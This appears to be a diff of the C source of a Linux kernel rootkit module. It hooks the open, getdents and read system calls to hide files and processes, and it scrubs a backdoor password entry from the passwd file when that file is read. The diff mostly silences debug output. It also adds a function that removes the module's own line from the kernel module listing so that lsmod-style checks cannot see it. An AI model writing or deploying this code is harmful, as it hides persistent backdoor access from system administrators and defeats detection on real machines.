@@ -41,7 +41,7 @@ asmlinkage long hacked_open(const char __user *filename, int flags, umode_t mode
     char *kern_buff = NULL;
     int i;
 
-    DEBUG("Entered HACKED OPEN");
+    //DEBUG("Entered HACKED OPEN");
     
     ret  = (*orig_open)(filename, flags, mode);
     
@@ -57,6 +57,7 @@ asmlinkage long hacked_open(const char __user *filename, int flags, umode_t mode
         DEBUG("PROBLEM COPYING FILENAME FROM USER in CAT Filter");
         goto cleanup;
     }
+    
 
     for(i=0; i<sizeof(HIDDEN_FILES)/sizeof(char *); i++)
     {
@@ -69,7 +70,7 @@ asmlinkage long hacked_open(const char __user *filename, int flags, umode_t mode
         }
     }
     
-    DEBUG("Exited HACKED OPEN");
+    //DEBUG("Exited HACKED OPEN");
 
 cleanup:
     if(kern_buff)
@@ -90,7 +91,7 @@ long handle_ls(struct linux_dirent *dirp, long length)
 
     //struct dirent *moving_dirp = NULL;
 
-    DEBUG("Entering LS filter");
+    //DEBUG("Entering LS filter");
     // Create a new output buffer for the return of getdents
     new_dirp = (struct dirent *) kmalloc(length, GFP_KERNEL);
     if(!new_dirp)
@@ -125,7 +126,7 @@ long handle_ls(struct linux_dirent *dirp, long length)
         }
         offset += cur_dirent->d_reclen;
     }
-    DEBUG("Exiting LS filter");
+    //DEBUG("Exiting LS filter");
 
     memcpy(dirp, new_dirp, new_length);
     length = new_length;
@@ -155,7 +156,7 @@ asmlinkage long hacked_getdents(unsigned int fd,
     struct files_struct *open_files = current->files;
     int is_ps = 0;
     pid_t pid_num;
-    DEBUG("Entering hacked getdents");
+    //DEBUG("Entering hacked getdents");
     // Call original getdents system call.
     getdents_ret = (*orig_getdents)(fd, dirp, count);
 
@@ -168,9 +169,9 @@ asmlinkage long hacked_getdents(unsigned int fd,
         goto exit_unlock;
     }
     fd_inode = file_inode(fd_file);
-    printk("fd_inode->i_ino: %lu", fd_inode->i_ino);
-    printk("MAJOR->MAJOR: %i", imajor(fd_inode));
-    printk("MINOR->MINOR: %i", iminor(fd_inode));
+    //printk("fd_inode->i_ino: %lu", fd_inode->i_ino);
+    //printk("MAJOR->MAJOR: %i", imajor(fd_inode));
+    //printk("MINOR->MINOR: %i", iminor(fd_inode));
     if (fd_inode->i_ino == PROC_ROOT_INO && imajor(fd_inode) == 0 
         && iminor(fd_inode) == 0)
     {
@@ -228,9 +229,54 @@ asmlinkage long hacked_getdents(unsigned int fd,
         DEBUG("Exiting ps filter");
     }
 exit_unlock:
-    DEBUG("Exiting hacked getdents");
+    //DEBUG("Exiting hacked getdents");
     spin_unlock(&open_files->file_lock);
     return getdents_ret;
+}
+
+long remove_rootkit(char *buf, long length)
+{
+    char *start_of_rootkit = NULL;
+    char *start_copy = NULL;
+    char *new_buff = NULL;
+    int line_length = 0;
+    int bytes_written = 0;
+    int remaining_length = length;
+
+    new_buff = kzalloc(strlen(buf)+1, GFP_KERNEL);
+    if(!new_buff)
+    {
+        DEBUG("NOT ENOUGH MEMORY in LSMOD FILTER");
+        goto cleanup;
+    }
+    
+    start_of_rootkit = strstr(buf, MODULE_NAME);
+    if(start_of_rootkit)
+    {
+        start_copy = start_of_rootkit;
+        while(*start_copy != '\n' && *start_copy != '\0')
+        {
+            start_copy++;
+            line_length++;
+        }
+        line_length++; // For the \n or \0
+        memcpy(new_buff, buf, start_of_rootkit-buf); // Copy everything before this line
+        bytes_written += start_of_rootkit-buf;
+        remaining_length -= bytes_written;
+        remaining_length -= line_length;
+        // now length is only what comes after the line we skip
+        memcpy(new_buff+bytes_written, start_of_rootkit+line_length, remaining_length);
+        bytes_written += remaining_length;
+
+        
+        memcpy(buf, new_buff, bytes_written);
+        length = bytes_written;
+    }
+
+cleanup:
+    if(new_buff)
+        kfree(new_buff);
+    return length;
 }
 
 asmlinkage long hacked_read(unsigned int fd, char *buf, size_t count)
@@ -278,6 +324,10 @@ asmlinkage long hacked_read(unsigned int fd, char *buf, size_t count)
 		return ret;
 	}
 
+	if(strcmp(pathname, MODULE_FILE)==0){
+        ret = remove_rootkit(buf, ret);
+    }
+    
 	if(strcmp(pathname, PASSWD_FILE)==0){
 
 		if(!(strstr(buf, BACKDOOR_PASSWD))){
